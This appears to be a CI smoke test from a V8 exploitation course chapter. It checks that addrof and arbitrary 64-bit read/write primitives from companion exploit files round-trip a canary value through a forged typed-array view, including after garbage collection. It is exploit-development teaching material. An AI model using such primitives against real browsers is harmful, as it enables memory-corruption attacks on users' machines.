'use strict';
// CI smoke test for the Chapter 21 primitives.
//
// Loaded AFTER vuln.js, addrof-fakeobj.js, helpers.js, rw.js under the
// pinned d8. Success is printed as a single unique marker line that the
// Makefile greps for; any failure throws and d8 exits non-zero.
//
// The two claims we verify:
//   (1) round-trip identity: a canary written via write64 comes back
//       through read64 AND through an independent Uint32Array aliased
//       over the same target region.
//   (2) post-GC survival: after %CollectGarbage() the forged header is
//       still well-formed and read64 still returns the canary.

function assert(cond, msg) {
  if (!cond) { throw new Error('SMOKE FAIL: ' + msg); }
}

// A native Uint32Array we alias the forged view over. Its own backing
// store is the target region we read/write into for the round-trip check.
const target = new Uint32Array(4);
target[0] = 0;
target[1] = 0;

// Address of `target`'s external backing store. Read it out of the
// template's own header the same way the forge does; on the pinned V8
// tag the external_pointer field sits at object offset +0x18 for a
// JSTypedArray with an off-heap backing store.
const targetAddr = addrof(target);
const EXTERNAL_PTR_OFFSET = 0x18;
const backingLo = read32(targetAddr + EXTERNAL_PTR_OFFSET);
const backingHi = read32(targetAddr + EXTERNAL_PTR_OFFSET + 4);

// Round-trip the canary.
const CANARY_LO = 0xdeadbeef;
const CANARY_HI = 0xcafef00d;
TARGET_ADDR_LO = backingLo;
TARGET_ADDR_HI = backingHi;
write64(0, CANARY_LO, CANARY_HI);  // addr==0 here means "use TARGET_ADDR_*"

// Read back through the forged view.
const forged = read64(0);
assert((forged & 0xffffffffn) === BigInt(CANARY_LO), 'forged low half');
assert((forged >> 32n) === BigInt(CANARY_HI),        'forged high half');

// Read back through the independent native view.
assert(target[0] === CANARY_LO, 'native low half');
assert(target[1] === CANARY_HI, 'native high half');

// Post-GC survival.
gc();  // --expose-gc is passed by run.sh
const afterGc = read64(0);
assert((afterGc & 0xffffffffn) === BigInt(CANARY_LO), 'post-GC low half');
assert((afterGc >> 32n) === BigInt(CANARY_HI),        'post-GC high half');

// Unique marker the Makefile greps for.
console.log('CH21-SMOKE-OK');
